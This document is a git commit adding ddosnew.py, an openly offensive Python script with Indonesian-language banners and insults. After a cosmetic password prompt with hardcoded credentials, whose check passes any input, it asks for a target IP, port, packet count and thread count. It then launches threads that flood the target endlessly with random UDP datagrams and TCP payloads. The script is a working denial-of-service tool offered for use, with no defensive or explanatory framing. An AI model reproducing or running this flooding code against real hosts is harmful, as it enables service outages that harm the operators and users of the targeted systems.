2e60ead0a6bbbb36c51c718f49cca8b0aa9c0a94
TetekBengek <108326710+TetekBengek@users.noreply.github.com>
2022-06-28 08:06:19 +0000

    Add files via upload

---
+++ ddosnew.py
@@ -0,0 +1,245 @@
+#!/usr/bin/env python3
+import random
+import socket
+import threading
+import time
+import os,sys
+import random, socket, threading
+import os
+import getpass
+
+print("""
+\033[0;32m _                         
+\033[0;32m( )                _       
+\033[0;32m| |      _     __ (_) ___  
+\033[0;32m| |  _ / _ \ / _  \ |  _  \\
+\033[0;32m| |_( ) (_) ) (_) | | ( ) |
+\033[0;32m(____/ \___/ \__  |_)_) (_)
+\033[0;32m            ( )_) |        
+\033[0;32m             \___/         
+""")
+
+
+username_1 = 'Gio'
+password_1 = 'giogg'
+username_2 = 'GioDev'
+password_2 = 'GioSiPaling'
+username_3 = 'GioAllDown'
+password_3 = 'sipaling down'
+print('\nDEVELOPMENT BY GIO')
+
+username_4 = input ('\n\033[0;32mUsername : ')
+password_4 = getpass.getpass('\033[0;32mPassword : ')
+
+if username_4==username_1 and password_4==password_1:
+    print('''
+\033[0;32m ___                              _     
+\033[0;32m(  _ \ _        / \_/ \          ( )    
+\033[0;32m| ( (_)_) ___   |     |_   _  ___| |/ ) 
+\033[0;32m| | __| |  _  \ | (_) | ) ( )  __)   (  
+\033[0;32m| |(_ ) | ( ) | | | | | (_) |__  \ |\ \ 
+\033[0;32m(____/(_)_) (_) (_) (_)\___/(____/_) (_)
+''')
+    print('\033[0;32mLogin Succes' + username_1 + '')
+
+if username_4==username_2 and password_4==password_2:
+    print('''
+\033[0;32m _____                   
+\033[0;32m(___  )          _       
+\033[0;32m    | |  __     (_)  __  
+\033[0;32m _  | |/ __ \   | |/ __ \\
+\033[0;32m( )_| |  ___/   | |  ___/
+\033[0;32m \___/ \____)_  | |\____)
+\033[0;32m            ( )_| |      
+\033[0;32m             \___/       
+''')
+    print('\033[0;32mLogin Succes' + username_2 + '. .')
+
+if username_4==username_3 and password_4==password_3:
+    print(''''
+\033[0;32m _    _                   
+\033[0;32m( )  ( )                  
+\033[0;32m \ \/ /   __   ___    _ _ 
+\033[0;32m  )  (  / __ \  _  \/ _  )
+\033[0;32m / /\ \(  ___/ ( ) | (_| |
+\033[0;32m(_)  (_)\____)_) (_)\__ _)
+''')
+    print('\033[0;32mLogin Succes' + username_2 + '. .')
+
+else:
+    print('------------')
+    print('\033[0;32mAjellyJelly#0075 fot help \n')
+	
+for i in range(3):
+    pwd = ()
+    j = 3
+    if (pwd == password_1,password_2,password_3):
+        time.sleep(2)
+        print("[0] Lagi Loading.......")
+        time.sleep(1)
+        print("[10] Lagi Loading.......")
+        time.sleep(1)
+        print("[20] Lagi Loading.......")
+        time.sleep(1)
+        print("[30] Lagi Loading.......")
+        time.sleep(1)
+        print("[40] Lagi Loading.......")
+        time.sleep(1)
+        print("[50] Lagi Loading.......")
+        time.sleep(1)
+        print("[60] Lagi Loading.......")
+        time.sleep(1)
+        print("[70] Lagi Loading.......")
+        time.sleep(1)
+        print("[80] Lagi Loading.......")
+        time.sleep(1)
+        print("[90] Lagi Loading.......")
+        time.sleep(1)
+        print("[100] Proses Kontol\n")
+        time.sleep(3)
+        break
+    else:
+        time.sleep(2)
+        print("[x] Password Lu Salah ege kontod \n")
+        continue
+time.sleep(2)
+print("Berhasil Login Kontol")
+time.sleep(2)
+os.system("clear")
+
+
+print("\033[31m━━━ Langsung Down in? (y/n)")
+choice = str(input("┗━>\033[0m:"))
+print("""
+\033[0;31m _                     _               
+\033[0;31m( )                   ( )_             
+\033[0;31m| |      _     _ _   _| |_) ___    __  
+\033[0;31m| |  _ / _ \ / _  )/ _  | |  _  \/ _  \\
+\033[0;31m| |_( ) (_) ) (_| | (_| | | ( ) | (_) |
+\033[0;31m(____/ \___/ \__ _)\__ _)_)_) (_)\__  |
+\033[0;31m                                ( )_) |
+\033[0;31m                                 \___/ 
+""")
+time.sleep(1)
+print("""
+\033[0;31m _                     _               
+\033[0;31m( )                   ( )_             
+\033[0;31m| |      _     _ _   _| |_) ___    __  
+\033[0;31m| |  _ / _ \ / _  )/ _  | |  _  \/ _  \\
+\033[0;31m| |_( ) (_) ) (_| | (_| | | ( ) | (_) |
+\033[0;31m(____/ \___/ \__ _)\__ _)_)_) (_)\__  |
+\033[0;31m                                ( )_) |
+\033[0;31m                                 \___/ 
+""")
+time.sleep(2)
+print("""
+\033[0;31m _                     _               
+\033[0;31m( )                   ( )_             
+\033[0;31m| |      _     _ _   _| |_) ___    __  
+\033[0;31m| |  _ / _ \ / _  )/ _  | |  _  \/ _  \\
+\033[0;31m| |_( ) (_) ) (_| | (_| | | ( ) | (_) |
+\033[0;31m(____/ \___/ \__ _)\__ _)_)_) (_)\__  |
+\033[0;31m                                ( )_) |
+\033[0;31m                                 \___/ 
+""")
+time.sleep(3)
+os.system("clear")
+
+print("""
+\033[0;31m                 ██████ ▓██   ██▓ ███▄    █ ▄▄▄█████▓ ▄▄▄     ▒██   ██▒
+\033[0;31m               ▒██    ▒  ▒██  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▒████▄   ▒▒ █ █ ▒░
+\033[0;31m               ░ ▓██▄     ▒██ ██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒██  ▀█▄ ░░  █   ░
+\033[0;32m                 ▒   ██▒  ░ ▐██▓░▓██▒  ▐▌██▒░ ▓██▓ ░ ░██▄▄▄▄██ ░ █ █ ▒ 
+\033[0;32m               ▒██████▒▒  ░ ██▒▓░▒██░   ▓██░  ▒██▒ ░  ▓█   ▓██▒██▒ ▒██▒
+\033[0;32m               ▒ ▒▓▒ ▒ ░   ██▒▒▒ ░ ▒░   ▒ ▒   ▒ ░░    ▒▒   ▓▒█▒▒ ░ ░▓ ░
+\033[0;32m               ░ ░▒  ░   ▓██ ░▒░ ░ ░░   ░ ▒░    ░      ░   ▒▒ ░░   ░▒ ░
+\033[0;32m               ░  ░  ░   ▒ ▒ ░░     ░   ░ ░   ░ ░      ░   ▒   ░    ░  
+\033[0;32m                     ░   ░ ░              ░                ░   ░    ░ """)
+time.sleep(1)
+print("Loading..")
+time.sleep(2)
+os.system("clear")
+ip = str(input("  \033[0;31mIP:"))
+port = int(input(" \033[0;32mPort:"))
+times = int(input(" \033[0;31mPacket:"))
+threads = int(input(" \033[0;32mThreads:"))
+def run():
+	data = random._urandom(781)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" LAGI MENGATTACK TOD")
+		except:
+			print("[!] YAHAHAH SERVER DOWNN KENTOD!!!!!")
+
+def run2():
+	data = random._urandom(781)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" LAGI MENGATTACK TOD")
+		except:
+			print("[!] YAHAHAH SERVER DOWNN KENTOD!!!!!")
+
+def run3():
+	data = random._urandom(781)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" LAGI MENGATTACK TOD")
+		except:
+			print("[!] YAHAHAH SERVER DOWNN KENTOD!!!!!")
+
+def run4():
+	data = random._urandom(781)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" LAGI MENGATTACK TOD")
+		except:
+			print("[!] YAHAHAH SERVER DOWNN KENTOD!!!!!")
+
+def run5():
+	data = random._urandom(781)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" LAGI MENGATTACK TOD ")
+		except:
+			s.close()
+			print("[*] YAHAHAH SERVER DOWNN KENTOD!!!!!")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
